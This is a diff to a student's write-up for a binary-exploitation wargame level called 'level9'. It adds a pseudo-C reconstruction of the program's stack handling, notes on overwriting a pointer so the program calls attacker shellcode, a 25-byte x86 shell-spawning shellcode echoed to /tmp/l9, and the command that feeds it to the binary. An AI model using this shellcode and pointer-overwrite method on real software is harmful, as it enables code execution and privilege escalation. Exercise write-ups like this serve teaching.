@@ -6,11 +6,33 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:46 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/04 18:53:15 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/06 06:18:14 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
+The executable takes one argument
+After some logic setting up the puzzle, it takes actions than can written as
 
-./level9 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[SEGFAULT]
-binary reads first 4 chars as ptr
-then segfault when arg is too long
+	void *esp[]; //represents current stack
+	void *eax; //represents registers
+	void *edx; //represents registers
+
+	eax = *esp[4]; // dereferences 5th pointer on stack, offset 0x10
+	edx = *eax; // deref the result of that again
+	eax = esp[5]; // take the 6th pointer on the stack
+	esp[1] = eax; // store it in the 2nd position
+	eax = esp[4]; // take the 5th pointer
+	esp[0] = eax; // store it in the first position
+	edx(); // call function at edx
+
+After our overflow, esp[4] must be a pointer to a pointer to our shellcode
+We can't overflow over that part, but we can overflow over *esp[4]
+We must write the pointer to our shellcode here
+
+# 25 characters : the shellcode
+echo -e -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" > /tmp/l9
+
+
+
+# Launch exploit
+cat /tmp/l9 - | ./level9
